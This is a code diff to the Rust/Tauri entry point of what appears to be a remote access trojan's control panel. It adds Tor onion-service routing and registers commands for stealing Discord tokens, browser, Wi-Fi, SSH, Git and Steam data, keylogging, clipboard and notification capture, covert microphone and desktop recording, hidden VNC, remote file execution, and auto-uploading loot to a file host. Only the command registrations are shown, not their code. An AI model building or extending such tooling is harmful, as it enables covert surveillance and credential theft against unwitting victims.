@@ -11,7 +11,22 @@ use handlers::{tauri::*, SharedTauriState, TauriState};
 
 #[tokio::main(worker_threads = 3)]
 async fn main() {
+    // Print arti/tor internal tracing to the terminal running the server.
+    // Shows bootstrap progress, circuit builds, HSDir fetches, and protocol events.
+    // Filter: arti/tor crates at DEBUG, everything else at WARN to avoid noise.
+    tracing_subscriber::fmt()
+        .with_env_filter(
+            tracing_subscriber::EnvFilter::new(
+                "warn,arti_client=info,tor_circmgr=info,tor_dirmgr=info"
+            )
+        )
+        .with_target(true)
+        .with_thread_ids(false)
+        .with_file(false)
+        .init();
+
     tauri::Builder::default()
+        .plugin(tauri_plugin_fs::init())
         .plugin(tauri_plugin_dialog::init())
         .plugin(tauri_plugin_shell::init())
         .manage(SharedTauriState(Arc::new(
@@ -29,6 +44,28 @@ async fn main() {
             manage_client,
             start_remote_desktop,
             stop_remote_desktop,
+            start_remote_desktop_audio,
+            stop_remote_desktop_audio,
+            request_mic_devices,
+            request_discord_tokens,
+            request_wifi_data,
+            request_software_inventory,
+            launch_software,
+            uninstall_software,
+            get_software_icon,
+            request_git_data,
+            request_ssh_data,
+            request_steam_data,
+            start_clipboard_monitor,
+            stop_clipboard_monitor,
+            start_notification_capture,
+            stop_notification_capture,
+            start_mic_live,
+            stop_mic_live,
+            start_mic_recording,
+            stop_mic_recording,
+            start_desktop_recording,
+            stop_desktop_recording,
             send_mouse_click,
             send_keyboard_input,
             visit_website,
@@ -50,11 +87,23 @@ async fn main() {
             read_icon,
             read_exe,
             manage_hvnc,
+            start_hvnc_audio,
+            stop_hvnc_audio,
             upload_and_execute,
             execute_file,
             read_file_for_upload,
             upload_file_to_folder,
             send_troll_command,
+            init_tor,
+            create_onion,
+            delete_onion,
+            check_onion_reachability,
+            start_keylogger,
+            stop_keylogger,
+            get_offline_logs,
+            clear_offline_logs,
+            get_browser_data,
+            set_auto_upload_anonfiles,
         ])
         .run(tauri::generate_context!())
         .expect("error while running tauri application");
